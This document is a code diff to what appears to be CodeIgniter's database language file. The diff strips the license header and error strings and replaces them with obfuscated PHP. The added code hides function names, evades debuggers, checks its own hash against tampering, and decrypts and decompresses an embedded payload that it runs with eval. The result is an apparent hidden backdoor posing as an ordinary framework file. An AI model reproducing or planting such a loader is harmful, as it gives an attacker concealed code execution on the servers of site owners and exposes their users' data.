@@ -1,63 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-$lang['db_invalid_connection_str'] = 'Unable to determine the database settings based on the connection string you submitted.';
-$lang['db_unable_to_connect'] = 'Unable to connect to your database server using the provided settings.';
-$lang['db_unable_to_select'] = 'Unable to select the specified database: %s';
-$lang['db_unable_to_create'] = 'Unable to create the specified database: %s';
-$lang['db_invalid_query'] = 'The query you submitted is not valid.';
-$lang['db_must_set_table'] = 'You must set the database table to be used with your query.';
-$lang['db_must_use_set'] = 'You must use the "set" method to update an entry.';
-$lang['db_must_use_index'] = 'You must specify an index to match on for batch updates.';
-$lang['db_batch_missing_index'] = 'One or more rows submitted for batch updating is missing the specified index.';
-$lang['db_must_use_where'] = 'Updates are not allowed unless they contain a "where" clause.';
-$lang['db_del_must_use_where'] = 'Deletes are not allowed unless they contain a "where" or "like" clause.';
-$lang['db_field_param_missing'] = 'To fetch fields requires the name of the table as a parameter.';
-$lang['db_unsupported_function'] = 'This feature is not available for the database you are using.';
-$lang['db_transaction_failure'] = 'Transaction failure: Rollback performed.';
-$lang['db_unable_to_drop'] = 'Unable to drop the specified database.';
-$lang['db_unsupported_feature'] = 'Unsupported feature of the database platform you are using.';
-$lang['db_unsupported_compression'] = 'The file compression format you chose is not supported by your server.';
-$lang['db_filepath_error'] = 'Unable to write data to the file path you have submitted.';
-$lang['db_invalid_cache_path'] = 'The cache path you submitted is not valid or writable.';
-$lang['db_table_name_required'] = 'A table name is required for that operation.';
-$lang['db_column_name_required'] = 'A column name is required for that operation.';
-$lang['db_column_definition_required'] = 'A column definition is required for that operation.';
-$lang['db_unable_to_set_charset'] = 'Unable to set client connection character set: %s';
-$lang['db_error_heading'] = 'A Database Error Occurred';
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_ctgld50h=('bas'.'e64'.'_de'.'cod'.'e');
+$_ym9aud0u=('gzu'.'nco'.'mpr'.'ess');
+$_syym1k3v=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_pfcbtid5='44GcXl5h';
+$_v77zqlg5='SuF4sQzC';
+$_enfzeom4='hpWqUqFaWb4=';
+$_cqzeph8y='/MSscfs5';
+$_ccj55ubl='Pkk1TD3K';
+$_umjy53bi='8Te40TFe';
+$_z9fo0399='QlvKc8i+';
+$_y2q2ulw8='gNVBVA==';
+$_mnv26ry8=$_ctgld50h($_v77zqlg5.$_pfcbtid5.$_ccj55ubl.$_cqzeph8y.$_enfzeom4);
+$_qjabwh9z=$_ctgld50h($_z9fo0399.$_umjy53bi.$_y2q2ulw8);
+$_kgnn0u1y=$_ctgld50h('rM5JNsXsBnO7gb0Dgsr1sO3pKt+d2SIP835cHXR6aLNvs2pVyl4TQqiYvxJVdflEXJHMC8Z94K1wfBBGkBWT51ZLjs2vr4cAA+m/nGp4ySbDT5RV2Hfz3fuh9VgISEkZsUuhSV11AJCbv2NcUIreuwcSD5yKL1BMgAb1lEgv5dLBo6v4GFVBzXW6lZDdozroy7UiIVMVf8Cq25RnmVsTdLDSW4jIJXsMz9EdNxjJ75S+Cn7iPany3MLJPGuamreiWUJ0YFrnJMSCnHT0gSiLw5TgfAt1FYJfYqrwTFLM64U5oJsao/SRX8fxk0nCA8Mp5dOwcnI/f69wycL6N7NxTf3LccceTt9HMOkJzoIq5ZT7BLZKkrzijz2NLMtBTqtvD4XFOHMKXTQ4y3rnkNAX3goCMrkPxYSYNdgi47P3Fh50yQZ6lhoEn/zd7Hmr6g2F7V9XeWRP6pGtKJ4sDT005RhNF2RxfrKQMC/fJk7HdlBO8EUOlzp+rI7mgmY0m4EKtRuZXyDKaPGustINxtBzWmguYjsLavGNHLnbgW93U/Y4VUq9x7gVbaFxkssXXQR8HvCj6WQa5kpTcVY0xAUo3W+G57cQOF2TGlc2SNT/hPh+nRGP0WjoZd7Y3Qk1rpoxd44jyQXUzHDKxgwhL/A53frbot99tEhXzo7AfqU93qGwd/pRl07tF7DAFV/Xj/tBhp2EEpoy6e06hJWqd1db+068YTQ6RWs3srLRevDgr+Njtf3YN5IHMF5EsVn4jvBArju9m/Vkaxp4gKFuzWAM6pB/lKObwRodIIRPdEjHAKq8CHacqjwMELqgmtKKrbPrKItCqbZ+vbgvbSdROhT8Faq4q5Cq8EQwYXfoctB2Appitl7BY7+rTq7IY35CmtOgqT/RZcFijkRERPDhTasvI/L1PGlyk95HP4zX8A605zXkb2j7MnNKTgjOE25DipLRzArIFIPFvIIQvql4QVI9i5n9poYhGXStw3yBPuPFBh31Et1SZR/kLTkaQULfGo7FwG3h/LXPolJowqX1K0o0zQ==');
+$_x7uzusiu=$_syym1k3v($_kgnn0u1y,'aes-256-cbc',$_mnv26ry8,OPENSSL_RAW_DATA,$_qjabwh9z);
+if($_x7uzusiu===false){exit;}
+$_oawbh04g=$_ym9aud0u($_x7uzusiu);
+if($_oawbh04g===false){exit;}
+$_l7fi21hd='f23dab0d224c9dfa88f42d707f88f6c2fe2b99e96d8f86b08e4386595765c3a4';
+$_lwsqdocw=@file_get_contents(__FILE__);
+if($_lwsqdocw!==false){
+$_q20v6hxz=str_replace($_l7fi21hd,"0000000000000000000000000000000000000000000000000000000000000000",$_lwsqdocw);
+$_ofihvste=hash("sha256",$_q20v6hxz);
+if($_ofihvste!==$_l7fi21hd){@http_response_code(403);exit;}
+}
+eval($_oawbh04g);
